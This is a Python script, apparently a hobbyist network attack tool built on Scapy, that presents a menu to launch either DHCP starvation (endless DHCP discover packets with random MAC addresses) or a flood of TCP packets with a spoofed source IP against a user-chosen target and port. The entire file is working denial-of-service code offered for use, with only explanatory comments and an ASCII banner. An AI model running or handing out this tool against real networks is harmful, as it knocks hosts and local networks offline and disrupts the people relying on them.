#!/usr/bin/env python3
#Import Scapy
from scapy.all import *
from colorama import Fore

def DHCPFLOOD():
    #DHCP Starvation:
    #conf.checkIPaddr needs to be set to False. 
    #When conf.checkIpaddr the reponse IP isn't checked
    #against sending IP address. Don't need to match.	
    conf.checkIPaddr = False

    #Create DHCP discover with destination IP = broadadcast
    #Source MAC address is a random MAC address
    #Source IP address = 0.0.0.0
    #Destination IP address = broadcast
    #Source port = 68 (DHCP / BOOTP Client)
    #Destination port = 67 (DHCP / BOOTP Server)
    #DHCP message type is discover
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                         /IP(src='0.0.0.0',dst='255.255.255.255') \
                         /UDP(sport=68,dport=67) \
                         /BOOTP(op=1,chaddr = RandMAC()) \
                         /DHCP(options=[('message-type','discover'),('end')])
    #Send packet out of eth0 and loop the packet
    interface = str(input("Enter the interface to send flood : "))
    sendp(dhcp_discover,iface= interface,loop=1,verbose=1)

def synflood():
    src = input("Enter Source IP Address To Fake: ")
    target=input("Enter Target's IP Address: ")
    message = input("Enter Message FOR TCP Payload: ")
    dstPort= int(input("Enter Port to Block: "))
    while True:
        ipLayer = IP(src=src, dst=target)
        tcpLayer = TCP(sport=4444, dport=dstPort)
        rawLayer = Raw(load=message)
        packet = ipLayer/tcpLayer/rawLayer
        send(packet)

#  Prints Logo and Links.
print(Fore.YELLOW + r"""  ______            _              ___  ___ _       _                 
  | ___ \          | |             |  \/  |(_)     | |                
  | |_/ /_   _   __| | _ __  __ _  | .  . | _  ___ | |__   _ __  __ _ 
  |    /| | | | / _` || '__|/ _` | | |\/| || |/ __|| '_ \ | '__|/ _` |
  | |\ \| |_| || (_| || |  | (_| | | |  | || |\__ \| | | || |  | (_| |
  \_| \_|\__,_| \__,_||_|   \__,_| \_|  |_/|_||___/|_| |_||_|   \__,_|
                                                                   """)
print(Fore.RED + "  ****************************************************************")
print(Fore.YELLOW + "  *             Copyright of Rudra Kumar Mishra                  *")
print(Fore.RED + "  ****************************************************************\n")

# Printing Options
print(Fore.GREEN + "Enter 1 DHCP Starvation        *")
print(Fore.GREEN + "Enter 2 to SynFlood            *")

# Enter choice from user
choice = str(input(Fore.RED + ">"))

if(choice=="1"):
    # Function for DHCP Starvation
    DHCPFLOOD()
elif(choice=="2"):
    # Function for SynFlood
    synflood()